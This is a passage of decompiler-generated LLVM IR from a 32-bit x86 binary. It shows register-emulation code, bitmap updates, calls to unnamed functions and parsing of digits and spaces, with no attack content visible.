dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_8052729(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_80528be()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_80521f1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8051d00()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp242 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp242, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp243 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp243, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b30.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b30.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
